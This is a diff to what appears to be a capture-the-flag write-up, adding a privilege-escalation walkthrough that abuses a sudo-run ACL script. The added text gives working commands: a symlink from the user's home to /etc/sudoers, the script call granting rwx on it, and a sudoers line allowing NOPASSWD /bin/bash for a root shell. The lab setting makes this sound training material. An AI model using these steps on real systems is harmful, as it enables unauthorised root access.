@@ -1,4 +1,5 @@
 We start with nmap showing us that there is a web server and an unknown port:
+
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -105,6 +106,28 @@ fi
 
 /usr/bin/sudo /usr/bin/setfacl -m u: "$user":"$perm" "$target"
 
+Basically, the script takes 3 input: the user, the permissions we want to set and the target file to which the permissions will be added.
+The scripts does some check to prevent the input of target files out of mtz's home directory, and also check if the target it's a file.
+
+I will be honest, it took me some times to understand how to bypass these checks, so try more times if you are stuck before giving up.
+
+I thinks there are more way to do this. I created a symlink in /home/mtz pointing to /etc/sudoers:
+
+ln -s /etc/sudoers /home/mtz/link
+
+and started the script giving to mtz user wxr perms to the file the symlink is pointing to:
+
+sudo /opt/acl.sh mtz rwx /home/mtz/link
+
+Awesome! Now we can edit the /etc/sudoers in order to give to mtz user the permission to start /bin/bash as root:
+
+# See sudoers(5) for more information on "@include" directives:
+
+@includedir /etc/sudoers.d
+mtz ALL=(ALL:ALL) NOPASSWD: /opt/acl.sh
+mtz ALL=(ALL:ALL) NOPASSWD: /bin/bash
+
+Now we just launch sudo /bin/bash and we are root!!
 
 
 
